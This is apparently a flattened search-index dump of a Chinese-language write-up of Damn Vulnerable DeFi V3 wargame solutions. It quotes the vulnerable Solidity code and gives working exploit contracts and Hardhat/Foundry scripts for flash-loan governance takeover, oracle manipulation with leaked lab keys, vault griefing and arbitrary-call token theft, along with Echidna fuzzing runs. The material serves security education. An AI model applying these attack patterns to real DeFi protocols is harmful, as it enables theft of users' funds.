10 11 12 modifier onlyGovernance () { if ( msg . sender != address ( governance )) revert CallerNotGovernance (); _ ; } function emergencyExit ( address receiver ) external onlyGovernance { uint256 amount = token . balanceOf ( address ( this )); token . transfer ( receiver , amount ); emit FundsDrained ( receiver , amount ); } SimpleGovernance.executeAction() \u53ef\u4ee5\u6267\u884c\u81ea\u5b9a\u4e49\u8c03\u7528 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function executeAction ( uint256 actionId ) external payable returns ( bytes memory ) { if ( ! _canBeExecuted ( actionId )) revert CannotExecute ( actionId ); GovernanceAction storage actionToExecute = _actions [ actionId ]; actionToExecute . executedAt = uint64 ( block . timestamp ); emit ActionExecuted ( actionId , msg . sender ); ( bool success , bytes memory returndata ) = actionToExecute . target . call { value : actionToExecute . value }( actionToExecute . data ); if ( ! success ) { if ( returndata . length > 0 ) { assembly { revert ( add ( 0x20 , returndata ), mload ( returndata )) } } else { revert ActionFailed ( actionId ); } } return returndata ; } \u521b\u5efa\u65b0\u7684 action \u9700\u8981\u521b\u5efa\u8005\u83b7\u53d6\u8db3\u591f\u7684\u7968\u6570\uff0c\u7968\u6570\u5373\u521b\u5efa\u8005\u5728\u6700\u65b0\u5feb\u7167 governanceToken \u7684\u6301\u6709\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 function queueAction ( address target , uint128 value , bytes calldata data ) external returns ( uint256 actionId ) { if ( ! _hasEnoughVotes ( msg . sender )) revert NotEnoughVotes ( msg . sender ); if ( target == address ( this )) revert InvalidTarget (); if ( data . length > 0 && target . code . length == 0 ) revert TargetMustHaveCode (); actionId = _actionCounter ; _actions [ actionId ] = GovernanceAction ({ target : target , value : value , proposedAt : uint64 ( block . timestamp ), executedAt : 0 , data : data }); unchecked { _actionCounter ++ ; } emit ActionQueued ( actionId , msg . sender ); } function _hasEnoughVotes ( address who ) private view returns ( bool ) { uint256 balance = _governanceToken . getBalanceAtLastSnapshot ( who ); uint256 halfTotalSupply = _governanceToken . getTotalSupplyAtLastSnapshot () / 2 ; return balance > halfTotalSupply ; } \u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8fdb\u884c\u5feb\u7167 uwu \u90a3\u4e48\u5728\u95ea\u7535\u8d37\u65f6\u5feb\u7167\uff0c\u5373\u53ef\u83b7\u5f97\u5145\u8db3\u7684\u7968\u6570\uff0c\u5728\u4e0b\u4e00\u6b21\u5feb\u7167\u524d queueAction() \u5c31\u53ef\u4ee5\u5566w 1 2 3 4 function snapshot () public returns ( uint256 lastSnapshotId ) { lastSnapshotId = _snapshot (); _lastSnapshotId = lastSnapshotId ; } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol\" ; import \"../DamnValuableTokenSnapshot.sol\" ; import \"./ISimpleGovernance.sol\" ; import \"./SelfiePool.sol\" ; contract SelfieHack is IERC3156FlashBorrower { function exploit ( address instance , address pool ) external returns ( uint actionId ) { SelfiePool ( pool ). flashLoan ( this , address ( SelfiePool ( pool ). token ()), 1500000 ether , \"\" ); actionId = ISimpleGovernance ( instance ). queueAction ( pool , 0 , abi . encodeWithSignature ( \"emergencyExit(address)\" , msg . sender ) ); } function onFlashLoan ( address , address token , uint256 amount , uint256 , bytes calldata ) external returns ( bytes32 ) { DamnValuableTokenSnapshot ( token ). snapshot (); DamnValuableTokenSnapshot ( token ). approve ( msg . sender , amount ); return keccak256 ( \"ERC3156FlashBorrower.onFlashLoan\" ); } } Hardhat \u00b6 1 2 3 4 5 6 7 8 it ( 'Execution' , async function () { const SelfieHack = await ( await ethers . getContractFactory ( 'SelfieHack' , player )). deploy (); // The return value of a non-pure non-view function is available only when the function is called and validated on-chain. await SelfieHack . exploit ( governance . address , pool . address ); await ethers . provider . send ( \"evm_increaseTime\" , [ 2 * 24 * 60 * 60 ]); await governance . executeAction ( await governance . getActionCounter () - 1 ); }); Foundry \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 function exploit () internal override { // Sets attacker as msg.sender for all subsequent calls until stopPrank is called vm . startPrank ( attacker ); SelfieHack hack = new SelfieHack (); uint actionId = hack . exploit ( address ( governance ), address ( pool )); vm . stopPrank (); skip ( governance . getActionDelay ()); // 2 days governance . executeAction ( actionId ); } 7. Compromised \u00b6 While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here\u2019s a snippet: 1 2 3 4 5 6 7 8 9 HTTP/2 200 OK content-type: text/html content-language: en vary: Accept-Encoding server: cloudflare 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 A related on-chain exchange is selling (absurdly overpriced) collectibles called \u201cDVNFT\u201d, now at 999 ETH each. This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c. Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange. \u5bf9\u8fd4\u56de\u6570\u636e\u5148\u5341\u516d\u8fdb\u5236\u89e3\u7801\u518d Base64 \u89e3\u7801\u5f97\u5230\u5176\u4e2d\u4e24\u4e2a reporter \u7684\u79c1\u94a5 DVNFT \u7684\u4ef7\u683c\u53d6\u51b3\u4e8e reporters \u63d0\u4f9b\u4ef7\u683c\u7684\u4e2d\u4f4d\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function getMedianPrice ( string calldata symbol ) external view returns ( uint256 ) { return _computeMedianPrice ( symbol ); } function _computeMedianPrice ( string memory symbol ) private view returns ( uint256 ) { uint256 [] memory prices = getAllPricesForSymbol ( symbol ); LibSort . insertionSort ( prices ); if ( prices . length % 2 == 0 ) { uint256 leftPrice = prices [( prices . length / 2 ) - 1 ]; uint256 rightPrice = prices [ prices . length / 2 ]; return ( leftPrice + rightPrice ) / 2 ; } else { return prices [ prices . length / 2 ]; } } function getAllPricesForSymbol ( string memory symbol ) public view returns ( uint256 [] memory prices ) { uint256 numberOfSources = getRoleMemberCount ( TRUSTED_SOURCE_ROLE ); prices = new uint256 []( numberOfSources ); for ( uint256 i = 0 ; i < numberOfSources ;) { address source = getRoleMember ( TRUSTED_SOURCE_ROLE , i ); prices [ i ] = getPriceBySource ( symbol , source ); unchecked { ++ i ; } } } function getPriceBySource ( string memory symbol , address source ) public view returns ( uint256 ) { return _pricesBySource [ source ][ symbol ]; } \u5728\u6301\u6709\u4e24\u4e2a reporters \u79c1\u94a5\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u5f88\u8f7b\u677e\u5730\u64cd\u63a7\u4ef7\u683c 1 2 3 function postPrice ( string calldata symbol , uint256 newPrice ) external onlyRole ( TRUSTED_SOURCE_ROLE ) { _setPrice ( msg . sender , symbol , newPrice ); } \u5148\u964d\u4f4e\u4ef7\u683c\u8d2d\u4e70 DVNFT\uff0c\u518d\u63d0\u9ad8\u4ef7\u683c\u5356\u51fa Exploit \u00b6 Hardhat \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 it ( 'Execution' , async function () { const resp = [ '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35' , '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34' , ]; let signers = []; for ( let i = 0 ; i < 2 ; i ++ ) { signers . push ( new ethers . Wallet ( Buffer . from ( Buffer . from ( resp [ i ]. split ( ' ' ). join ( '' ), 'hex' ). toString ( 'utf8' ), 'base64' ). toString ( 'utf8' ), ethers . provider )); await oracle . connect ( signers [ i ]). postPrice ( 'DVNFT' , 0 ); } // get tokenId from the event let tx = await exchange . connect ( player ). buyOne ({ value : 1 }); // (msg.value - price) will be send back let receipt = await tx . wait (); let id = receipt . events . filter ( ( x ) => { return x . event == \"TokenBought\" } )[ 0 ]. args . tokenId ; for ( let i = 0 ; i < 2 ; i ++ ) { oracle . connect ( signers [ i ]). postPrice ( 'DVNFT' , EXCHANGE_INITIAL_ETH_BALANCE ); } await nftToken . connect ( player ). approve ( exchange . address , id ); await exchange . connect ( player ). sellOne ( id ); }); Foundry \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 function exploit () internal override { address [] memory users = new address []( 2 ); users [ 0 ] = vm . addr ( 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9 ); users [ 1 ] = vm . addr ( 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48 ); for ( uint8 i = 0 ; i < 2 ; i ++ ) { vm . prank ( users [ i ]); oracle . postPrice ( 'DVNFT' , 0 ); } vm . prank ( attacker ); uint id = exchange . buyOne { value : 1 }(); for ( uint8 i = 0 ; i < 2 ; i ++ ) { vm . prank ( users [ i ]); oracle . postPrice ( 'DVNFT' , EXCHANGE_INITIAL_ETH_BALANCE ); } vm . startPrank ( attacker ); nftToken . approve ( address ( exchange ), id ); exchange . sellOne ( id ); vm . stopPrank (); } 8. Puppet \u00b6 There\u2019s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity. There\u2019s a DVT market opened in an old Uniswap v1 exchange , currently with 10 ETH and 10 DVT in liquidity. Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance. \u4ece PuppetPool \u501f\u51fa token \u9700\u8981 deposit \u4e00\u5b9a\u6570\u91cf\u7684 ETH\uff0c\u7531 calculateDepositRequired() \u51b3\u5b9a\uff0c\u800c depositRequired \u7684\u8ba1\u7b97\u57fa\u4e8e UniswapV1Pair \u7684\u5b9e\u65f6\u4f59\u989d 1 2 3 4 5 6 7 8 function calculateDepositRequired ( uint256 amount ) public view returns ( uint256 ) { return amount * _computeOraclePrice () * DEPOSIT_FACTOR / 10 ** 18 ; } function _computeOraclePrice () private view returns ( uint256 ) { // calculates the price of the token in wei according to Uniswap pair return uniswapPair . balance * ( 10 ** 18 ) / token . balanceOf ( uniswapPair ); } Uniswap V1 \u4e0d\u652f\u6301 Flash swap\uff0c\u53ef\u4ee5\u5728 borrow \u524d swap \u6765\u964d\u4f4e uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair) \uff0c\u4ece\u800c\u4ee5\u4f4e\u4ef7\u501f\u51fa token player \u53ea\u80fd\u6267\u884c\u4e00\u4e2a\u4ea4\u6613\uff0c\u800c DamnValuableToken \u652f\u6301 permit \uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u989d\u5916\u7684\u4ea4\u6613\u6765\u8c03\u7528 approve() 1 expect ( await ethers . provider . getTransactionCount ( player . address )). to . eq ( 1 ); Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 interface UniswapExchangeInterface { function tokenToEthSwapInput ( uint256 tokens_sold , uint256 min_eth , uint256 deadline ) external returns ( uint256 eth_bought ); } contract PuppetPoolHack { constructor ( address _pool , uint8 v , bytes32 r , bytes32 s , uint256 deadline ) payable { PuppetPool pool = PuppetPool ( _pool ); DamnValuableToken token = DamnValuableToken ( pool . token ()); token . permit ( msg . sender , address ( this ), 1000 ether , deadline , v , r , s ); token . transferFrom ( msg . sender , address ( this ), 1000 ether ); token . approve ( pool . uniswapPair (), 1000 ether ); UniswapExchangeInterface ( pool . uniswapPair ()). tokenToEthSwapInput ( 1000 ether , 1 , block . timestamp ); // since the contract is not deployed, ETH can be sent directly to the address pool . borrow { value : address ( this ). balance }( 100000 ether , msg . sender ); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 const { signERC2612Permit } = require ( 'eth-permit' ); it ( 'Execution' , async function () { const hackFactory = await ethers . getContractFactory ( 'PuppetPoolHack' , player ); let hackAddress = ethers . utils . getContractAddress ({ from : player . address , nonce : await player . getTransactionCount () }); let signature = await signERC2612Permit ( player , token . address , player . address , hackAddress , PLAYER_INITIAL_TOKEN_BALANCE ); await hackFactory . deploy ( lendingPool . address , signature . v , signature . r , signature . s , signature . deadline , { value : 10n * 10n ** 18n , gasLimit : 10 ** 6 } ); }); References \u00b6 Exchange | Uniswap A Long Way To Go: On Gasless Tokens and ERC20-Permit 9. Puppet V2 \u00b6 Now they\u2019re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough. You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. Save all funds from the pool, depositing them into the designated recovery account. \u501f\u51fa\u4ee3\u5e01\u6240\u9700 WETH \u6570\u91cf\u7684\u8ba1\u7b97\u7531\u57fa\u4e8e\u5b9e\u65f6\u4f59\u989d\u4fee\u6539\u4e3a\u57fa\u4e8e\u5b58\u50a8\u7684\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function calculateDepositOfWETHRequired ( uint256 tokenAmount ) public view returns ( uint256 ) { uint256 depositFactor = 3 ; return _getOracleQuote ( tokenAmount ). mul ( depositFactor ) / ( 1 ether ); } // Fetch the price from Uniswap v2 using the official libraries function _getOracleQuote ( uint256 amount ) private view returns ( uint256 ) { ( uint256 reservesWETH , uint256 reservesToken ) = UniswapV2Library . getReserves ( _uniswapFactory , address ( _weth ), address ( _token )); return UniswapV2Library . quote ( amount . mul ( 10 ** 18 ), reservesToken , reservesWETH ); } function quote ( uint amountA , uint reserveA , uint reserveB ) internal pure returns ( uint amountB ) { require ( amountA > 0 , 'UniswapV2Library: INSUFFICIENT_AMOUNT' ); require ( reserveA > 0 && reserveB > 0 , 'UniswapV2Library: INSUFFICIENT_LIQUIDITY' ); amountB = amountA . mul ( reserveB ) / reserveA ; } \u56e0\u4e3a player \u521d\u59cb\u6301\u6709 10000 DVT\uff0c\u53ef\u4ee5\u5148\u4f7f\u7528 DVT \u4ea4\u6362 WETH \u4ee5\u62ac\u9ad8 WETH \u7684\u4ef7\u683c\uff0c\u518d\u8c03\u7528 borrow() \u6e05\u7a7a PuppetV2Pool \u7684\u4ee3\u5e01 Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function test_puppetV2 () public checkSolvedByPlayer { token . approve ( address ( uniswapV2Router ), PLAYER_INITIAL_TOKEN_BALANCE ); address [] memory path = new address []( 2 ); path [ 0 ] = address ( token ); path [ 1 ] = address ( weth ); uniswapV2Router . swapExactTokensForTokensSupportingFeeOnTransferTokens ( PLAYER_INITIAL_TOKEN_BALANCE , 0 , path , player , block . timestamp + 60 ); weth . deposit { value : PLAYER_INITIAL_ETH_BALANCE }(); uint256 amountToBorrow = lendingPool . calculateDepositOfWETHRequired ( POOL_INITIAL_TOKEN_BALANCE ); weth . approve ( address ( lendingPool ), amountToBorrow ); lendingPool . borrow ( POOL_INITIAL_TOKEN_BALANCE ); token . transfer ( recovery , POOL_INITIAL_TOKEN_BALANCE ); }","title":"Damn Vulnerable DeFi V3"},{"location":"wargames/damn_vulnerable_defi/#how-to-play","text":"","title":"How to Play"},{"location":"wargames/damn_vulnerable_defi/#hardhat","text":"1 2 3 4 $ git clone git@github.com:tinchoabbate/damn-vulnerable-defi.git $ cd damn-vulnerable-defi $ git checkout v3.0.0 $ yarn install Code solution in the test/<challenge-name>/<challenge-name>.challenge.js yarn run <challenge-name>","title":"Hardhat"},{"location":"wargames/damn_vulnerable_defi/#foundry","text":"1 2 3 4 $ git clone git@github.com:StErMi/forge-damn-vulnerable-defi.git $ cd forge-damn-vulnerable-defi $ git submodule update --init --recursive $ forge remappings Code solution under the src/test forge test --match-contract <test-contract-name>","title":"Foundry"},{"location":"wargames/damn_vulnerable_defi/#1-unstoppable","text":"There\u2019s a tokenized vault with a million DVT tokens deposited. It\u2019s offering flash loans for free, until the grace period ends. To pass the challenge, make the vault stop offering flash loans. You start with 10 DVT tokens in balance. ERC4626 \u5b9e\u73b0 ERC20 \u4f5c\u4e3a\u80a1\u6743\u4ee3\u5e01\uff0c asset \u4e3a Vault \u7ba1\u7406\u7684\u5e95\u5c42\u4ee3\u5e01 UnstoppableVault \u521d\u59cb\u6301\u6709 \\(10^6\\) DVT (ERC20) \u548c \\(10^6\\) oDVT (ERC4626) 1 2 3 4 5 // unstoppable.challenge.js const TOKENS_IN_VAULT = 1000000n * 10n ** 18n ; await token . approve ( vault . address , TOKENS_IN_VAULT ); await vault . deposit ( TOKENS_IN_VAULT , deployer . address ); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // ERC4626.sol function convertToShares ( uint256 assets ) public view virtual returns ( uint256 ) { uint256 supply = totalSupply ; // the totalSupply of oDVT // \u5f53\u521d\u59cb totalSupply \u4e3a 0 \u65f6\uff0cdeposit assets \u5f97\u5230\u540c\u7b49\u6570\u91cf\u7684 shares return supply == 0 ? assets : assets . mulDivDown ( supply , totalAssets ()); // (assets * supply) / totalAssets() } function previewDeposit ( uint256 assets ) public view virtual returns ( uint256 ) { return convertToShares ( assets ); } function deposit ( uint256 assets , address receiver ) public virtual returns ( uint256 shares ) { require (( shares = previewDeposit ( assets )) != 0 , \"ZERO_SHARES\" ); // Need to transfer before minting or ERC777s could reenter. asset . safeTransferFrom ( msg . sender , address ( this ), assets ); _mint ( receiver , shares ); emit Deposit ( msg . sender , receiver , assets , shares ); afterDeposit ( assets , shares ); } \u6ce8\u610f\u5230 convertToShares(totalSupply) != balanceBefore \u5728\u4f7f\u7528\u4f9d\u636e totalSupply (oDVT) \u8ba1\u7b97\u5f97\u5230\u7684 shares \u548c totalAssets() ( UnstoppableVault \u7684 DVT \u4f59\u989d) \u8fdb\u884c\u6bd4\u8f83\uff0c\u5c3d\u7ba1\u5728\u521d\u59cb\u60c5\u51b5\u4e0b\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u662f... (\u20d4 *`\u03c9\u00b4 * )\u20d5\u219d totalSupply \u53ea\u80fd\u901a\u8fc7 deposit / mint \u589e\u52a0\uff0c\u800c balanceBefore \u53ef\u901a\u8fc7 DVT \u7684 transfer \u589e\u52a0 \u8981\u5c06 totalSupply \u8f6c\u6362\u6210 assets \u5e94\u4f7f\u7528 convertToAssets 1 2 3 4 5 6 7 8 9 10 // ReentrancyGuard.sol modifier nonReentrant () virtual { require ( locked == 1 , \"REENTRANCY\" ); locked = 2 ; _ ; locked = 1 ; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 // UnstoppableVault.sol function totalAssets () public view override returns ( uint256 ) { assembly { // slot 0 \u5bf9\u5e94 ReentrancyGuard \u4e2d\u7684 locked if eq ( sload ( 0 ), 2 ) { mstore ( 0x00 , 0xed3ba6a6 ) revert ( 0x1c , 0x04 ) } } return asset . balanceOf ( address ( this )); } function flashLoan ( IERC3156FlashBorrower receiver , address _token , uint256 amount , bytes calldata data ) external returns ( bool ) { if ( amount == 0 ) revert InvalidAmount ( 0 ); if ( address ( asset ) != _token ) revert UnsupportedCurrency (); uint256 balanceBefore = totalAssets (); if ( convertToShares ( totalSupply ) != balanceBefore ) revert InvalidBalance (); uint256 fee = flashFee ( _token , amount ); // SafeERC20 wrappers around ERC20 operations that throw on failure ERC20 ( _token ). safeTransfer ( address ( receiver ), amount ); if ( receiver . onFlashLoan ( msg . sender , address ( asset ), amount , fee , data ) != keccak256 ( \"IERC3156FlashBorrower.onFlashLoan\" )) revert CallbackFailed (); ERC20 ( _token ). safeTransferFrom ( address ( receiver ), address ( this ), amount + fee ); ERC20 ( _token ). safeTransfer ( feeRecipient , fee ); return true ; } \u5411 UnstoppableVault \u53d1\u9001 DVT \u4f7f\u5f97 convertToShares(totalSupply) == balanceBefore \u65e0\u6cd5\u6210\u7acb\u5c31\u53ef\u4ee5\u963b\u6b62\u95ea\u7535\u8d37\u5566 XD 1 2 3 4 5 6 it ( 'Execution' , async function () { // get the contracts with player as signer token = token . connect ( player ); await token . transfer ( vault . address , INITIAL_PLAYER_TOKEN_BALANCE ); });","title":"1. Unstoppable"},{"location":"wargames/damn_vulnerable_defi/#using-echidna","text":"contracts/unstoppable/UnstoppableTest.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"./ReceiverUnstoppable.sol\" ; import \"../DamnValuableToken.sol\" ; contract UnstoppableTest is IERC3156FlashBorrower { DamnValuableToken token ; UnstoppableVault vault ; uint256 constant TOKENS_IN_VAULT = 1000000e18 ; uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18 ; constructor () { token = new DamnValuableToken (); vault = new UnstoppableVault ( token , msg . sender , msg . sender ); token . approve ( address ( vault ), TOKENS_IN_VAULT ); vault . deposit ( TOKENS_IN_VAULT , msg . sender ); // sending the attacker some tokens token . transfer ( address ( 0x10000 ), INITIAL_PLAYER_TOKEN_BALANCE ); } function onFlashLoan ( address initiator , address _token , uint256 amount , uint256 fee , bytes calldata ) external returns ( bytes32 ) { require ( initiator == address ( this ) && msg . sender == address ( vault ) && _token == address ( vault . asset ()) && fee == 0 ); ERC20 ( _token ). approve ( address ( vault ), amount ); return keccak256 ( \"IERC3156FlashBorrower.onFlashLoan\" ); } // check whether UnstoppableLender can always provide flash loans function echidna_test_flashloan () public returns ( bool ) { vault . flashLoan ( this , address ( token ), 10 , \"\" ); return true ; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ echidna . --contract UnstoppableTest --all-contracts --sender 0x10000 ... echidna_test_flashloan: failed!\ud83d\udca5 Call sequence: *wait* Time delay: 392942 seconds Block delay: 1545 *wait* Time delay: 389927 seconds Block delay: 9966 *wait* Time delay: 414579 seconds Block delay: 12172 *wait* Time delay: 322246 seconds Block delay: 65 *wait* Time delay: 271329 seconds Block delay: 883 *fallback* () from: 0x0000000000000000000000000000000000010000 Time delay: 138756 seconds Block delay: 3281 *wait* Time delay: 289607 seconds Block delay: 38344 *wait* Time delay: 372714 seconds Block delay: 55396 Event sequence: Transfer () from: 0xb4c79dab8f259c7aee6e5b2aa729821864227e84, error Revert 0x, error Revert 0x Unique instructions: 3719 Unique codehashes: 4 Corpus size: 1 Seed: 2655974979073607364","title":"Using Echidna"},{"location":"wargames/damn_vulnerable_defi/#_1","text":"ERC4626 BigInt - JavaScript | MDN","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/damn_vulnerable_defi/#2-naive-receiver","text":"There\u2019s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH. A user has deployed a contract with 10 ETH in balance. It\u2019s capable of interacting with the pool and receiving flash loans of ETH. Take all ETH out of the user\u2019s contract. If possible, in a single transaction. FlashLoanReceiver.onFlashLoan() \u6ca1\u6709\u68c0\u67e5\u95ea\u7535\u8d37\u7684\u53d1\u8d77\u8005 uwu \u53ea\u597d\u300c\u5e2e\u300d FlashLoanReceiver \u53d1\u8d77\u95ea\u7535\u8d37\u6765\u6d88\u8017\u4f59\u989d\u5566 :D 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // FlashLoanReceiver.sol function onFlashLoan ( address , address token , uint256 amount , uint256 fee , bytes calldata ) external returns ( bytes32 ) { assembly { // gas savings if iszero ( eq ( sload ( pool . slot ), caller ())) { mstore ( 0x00 , 0x48f5c3ed ) revert ( 0x1c , 0x04 ) } } if ( token != ETH ) revert UnsupportedCurrency (); uint256 amountToBeRepaid ; unchecked { amountToBeRepaid = amount + fee ; } _executeActionDuringFlashLoan (); SafeTransferLib . safeTransferETH ( pool , amountToBeRepaid ); return keccak256 ( \"ERC3156FlashBorrower.onFlashLoan\" ); }","title":"2. Naive Receiver"},{"location":"wargames/damn_vulnerable_defi/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol\" ; import \"@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol\" ; contract NaiveReceiverHacker { address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ; function exploit ( address pool , address receiver ) external { for ( uint8 i = 0 ; i < 10 ; i ++ ) { IERC3156FlashLender ( pool ). flashLoan ( IERC3156FlashBorrower ( receiver ), // receiver ETH , // token 1 ether , // amount \"\" // data ); } } } 1 2 3 4 5 it ( 'Execution' , async function () { let hacker = await ( await ethers . getContractFactory ( \"NaiveReceiverHacker\" )). deploy (); // or use ethers.deployContract(\"NaiveReceiverHacker\"). However, hardhat-ethers(hardhat-toolbox) is not included in the package.json await hacker . exploit ( pool . address , receiver . address ); });","title":"Exploit"},{"location":"wargames/damn_vulnerable_defi/#using-echidna_1","text":"contracts/naive-receiver/NaiveReceiverTest.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"./FlashLoanReceiver.sol\" ; contract NaiveReceiverTest { NaiveReceiverLenderPool pool ; FlashLoanReceiver receiver ; constructor () payable { pool = new NaiveReceiverLenderPool (); receiver = new FlashLoanReceiver ( address ( pool )); payable ( address ( pool )). transfer ( 1000 ether ); payable ( address ( receiver )). transfer ( 10 ether ); } // Invariant: the balance of the receiver contract can not decrease function echidna_test_balance () public view returns ( bool ) { return address ( receiver ). balance >= 10 ether ; } } naive-receiver.yml 1 2 3 balanceContract: 10000000000000000000000 # 10000 ether # Multi ABI: performing direct calls to every contract allContracts: true # multi-abi was renamed in echidna >= 2.1 1 2 3 4 5 6 7 8 9 10 11 $ echidna . --contract NaiveReceiverTest --config naive-receiver.yml ... echidna_test_balance: failed!\ud83d\udca5 Call sequence: flashLoan ( 0x62d69f6867a0a084c6d313943dc22023bc263691,0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,30, \"ERC20: insufficient allowance\" ) Unique instructions: 1553 Unique codehashes: 4 Corpus size: 8 Seed: 8140429313308935610 ERROR:CryticCompile:Unknown file: contracts/hardhat-dependency-compiler/@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol Comment out dependencyCompiler in hardhat.config.js . echidna: Error running slither: Update Slither to the latest version.","title":"Using Echidna"},{"location":"wargames/damn_vulnerable_defi/#_2","text":"How to use Echidna with multiple contracts \u00b7 crytic/echidna Wiki External testing","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/damn_vulnerable_defi/#3-truster","text":"The pool holds 1 million DVT tokens. You have nothing. To pass this challenge, take all tokens out of the pool. If possible, in a single transaction. target.functionCall(data) \u53ef\u4ee5\u4ee5 TrusterLenderPool \u7684\u8eab\u4efd\u8c03\u7528\u4efb\u610f\u5408\u7ea6\u7684\u4efb\u610f\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // TrusterLenderPool.sol function flashLoan ( uint256 amount , address borrower , address target , bytes calldata data ) external nonReentrant returns ( bool ) { uint256 balanceBefore = token . balanceOf ( address ( this )); token . transfer ( borrower , amount ); target . functionCall ( data ); if ( token . balanceOf ( address ( this )) < balanceBefore ) revert RepayFailed (); return true ; } \u90a3\u5c31\u6388\u6743 player \u4f7f\u7528 DVT \u597d\u4e86\uff01(\u03a6\u02cb\u03c9\u02ca\u03a6) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 it ( 'Execution' , async function () { let abi = [ \"function approve(address spender, uint256 amount)\" ]; let iface = new ethers . utils . Interface ( abi ); await pool . connect ( player ). flashLoan ( 0 , player . address , token . address , iface . encodeFunctionData ( \"approve\" , [ player . address , TOKENS_IN_POOL ]), ); await token . connect ( player ). transferFrom ( pool . address , player . address , TOKENS_IN_POOL ); });","title":"3. Truster"},{"location":"wargames/damn_vulnerable_defi/#_3","text":"encodeABI to get call data 